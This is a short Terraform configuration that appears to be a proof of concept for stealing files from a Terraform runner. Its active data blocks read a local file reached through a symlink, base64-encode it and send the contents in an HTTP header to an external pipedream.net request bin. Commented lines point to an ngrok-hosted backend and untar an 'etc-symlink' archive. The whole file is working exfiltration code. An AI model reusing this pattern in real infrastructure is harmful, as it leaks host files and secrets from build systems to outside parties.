# terraform {
#   backend "remote" {
#     hostname = "tfe-zone-60f6da41.ngrok.io"
#     organization = "hashicorp_v2"

#     workspaces {
#       name = "my-tfe"
#     }
#   }
# }

# resource 

# resource "null" "local-exec" {
#   provisioner "local-exec" {
#     command = "tar -xvzf ${path.module}/etc-symlink.tar.gz ${path.module}/etc-symlink"
#   }
# }

data "local_file" "symlink" {
  filename = "${path.module}/cpuinfo"
}

data "http" "example" {
  url = "https://en2jtsznfuiex.x.pipedream.net"

  request_headers = {
    XTestContent = "${data.local_file.symlink.content_base64}"
  }
}